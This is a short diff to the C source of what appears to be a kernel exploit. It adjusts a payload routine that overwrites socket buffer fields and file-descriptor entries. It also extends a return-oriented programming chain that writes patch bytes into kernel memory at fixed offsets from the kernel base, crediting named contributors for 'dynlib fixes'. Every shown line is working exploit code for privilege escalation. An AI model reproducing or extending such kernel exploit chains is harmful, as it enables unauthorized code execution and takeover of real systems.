@@ -522,7 +522,7 @@ void* kernel_payload(void* o, int****** td, unsigned long long kernel_base, uint
             sock[base] = 0; // sb_mb low
             sock[base+1] = 0; // sb_mb high
         }
-        fd[kp_bad_fds[i]] = 0;
+        //fd[kp_bad_fds[i]] = 0;
     }
     fd[kp_bad_fds[6]] = (void*)decref_fp; //0;
     void** zone_pack = *(void**)(kernel_base + 0x1b45a28);
@@ -807,11 +807,14 @@ int main()
         __builtin_gadget_addr("pop rax"),
         0x9090,
         __builtin_gadget_addr("mov [rdi], ax"),
-        //dlsym by alazif
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base + 0x4523c4,
+        //dynlib fixes by alazif & chendochap
         __builtin_gadget_addr("pop rax"),
         0xe990,
+        __builtin_gadget_addr("pop rdi"),
+        kernel_base + 0x4523c4,
+        __builtin_gadget_addr("mov [rdi], ax"),
+        __builtin_gadget_addr("pop rdi"),
+        kernel_base + 0x451e04,
         __builtin_gadget_addr("mov [rdi], ax"),
         __builtin_gadget_addr("pop rdi"),
         kernel_base + 0x29a30,
